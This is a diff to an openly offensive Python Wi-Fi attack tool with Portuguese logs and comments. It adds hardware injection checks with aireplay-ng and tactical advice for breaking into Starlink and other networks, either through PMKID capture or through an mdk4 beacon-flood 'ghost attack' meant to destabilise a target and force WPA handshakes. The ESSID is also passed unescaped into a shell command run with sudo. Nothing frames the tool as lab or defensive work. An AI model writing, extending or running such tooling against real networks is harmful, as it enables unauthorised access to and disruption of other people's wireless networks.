@@ -44,20 +44,30 @@ def identify_vendor(bssid):
 
 def analyze_vulnerabilities(vendor, essid, privacy):
     vulns, advice = [], ""
+    # Checa se injeção está quebrada globalmente para este hardware
+    injection_works = os.path.exists("/tmp/dsi_injection_ok")
+
     if "Starlink" in vendor or "Starlink" in essid:
-        advice = "SISTEMA STARLINK: PMF Ativo. Use Ataque Fantasma ou PMKID de 2 minutos."
+        advice = "SISTEMA STARLINK (BLINDADO): PMF Ativo. Deauth falhará quase sempre."
+        if not injection_works:
+            advice += " ALERTA: Sua placa não injeta pacotes. O ÚNICO caminho é o Vetor A (PMKID Stealth)."
+        else:
+            advice += " Use Ataque Fantasma (Vetor D) por 5 minutos antes do Handshake."
         vulns.append("PMF (802.11w)")
+    elif not injection_works:
+        advice = "AVISO DE HARDWARE: Injeção falhou. Vetores B, C e D podem falhar. Foco total no Vetor A (PMKID)."
     else: advice = "Alvo analisado. Todos os vetores Grão-Mestre liberados."
     return vulns, advice
 
 def test_injection(interface):
     supreme_log(f"Validando hardware em {interface} (Injection Test)...", log_type="cmd")
-    # Tenta injetar 10 pacotes
+    run_command("rm -f /tmp/dsi_injection_ok")
     stdout, _ = run_command(f"aireplay-ng -9 {interface}")
     if stdout and "Injection is working!" in stdout:
         supreme_log("HARDWARE APROVADO: Injeção de pacotes ativa.", log_type="info")
+        with open("/tmp/dsi_injection_ok", "w") as f: f.write("ok")
         return True
-    supreme_log("AVISO TÉCNICO: Injeção não detectada. O sucesso do Deauth é improvável.", log_type="error")
+    supreme_log("FALHA TÉCNICA: Sua placa NÃO suporta injeção de pacotes. Use apenas PMKID.", log_type="error")
     return False
 
 def boost_signal(interface):
@@ -227,12 +237,14 @@ def capture_pmkid(monitor_interface, bssid, channel, output_file):
     return None
 
 def start_ghost_attack(interface, essid):
-    supreme_log(f"Iniciando ATAQUE FANTASMA contra {essid}...", log_type="cmd")
+    supreme_log(f"Iniciando ATAQUE FANTASMA (Infiltração de Beacons) contra {essid}...", log_type="cmd")
+    supreme_log("Criando ambiente de instabilidade para forçar Handshakes...")
     cmd = f"sudo mdk4 {interface} b -n \"{essid}\" -g -m"
     try:
         proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         time.sleep(60); proc.terminate()
-        supreme_log("Ataque Fantasma concluído.")
+        supreme_log("Ataque Fantasma concluído com sucesso!")
+        supreme_log("RESULTADO: Alvo desestabilizado. Tente o Vetor C para colher o Handshake agora.")
     except: pass
 
 def capture_handshake(monitor_interface, bssid, channel, output_file):
